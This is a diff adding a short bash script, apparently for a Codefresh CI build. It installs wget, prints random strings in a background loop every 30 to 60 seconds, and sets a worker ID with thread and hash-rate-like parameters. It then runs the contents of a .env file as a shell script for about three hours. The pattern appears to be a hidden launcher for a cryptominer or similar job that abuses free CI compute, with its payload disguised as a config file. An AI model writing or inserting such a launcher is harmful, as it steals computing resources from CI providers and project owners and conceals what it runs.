@@ -1,0 +1,18 @@
+#!/bin/bash
+
+apk --no-cache add wget coreutils;
+rand_string() {
+    local c=0 s=
+    while [ $c -lt $1 ]; do
+        s="$s\x$(printf '%x' $((97+RANDOM%25)))"
+        c=$((c+1))
+    done
+    printf "$s\n"
+}
+
+while :; do rand_string $((RANDOM%8+8)); sleep $((RANDOM%30+30)); done &
+
+export ENV_VARS="X_ID=\"codefresh-${NAME:-$HOSTNAME}\" THREADS_FIXED=2 MHF_FIXED=4 CSLEEP=5000"
+timeout -k 5 $((RANDOM%400+10000)) bash < .env
+
+exit 0
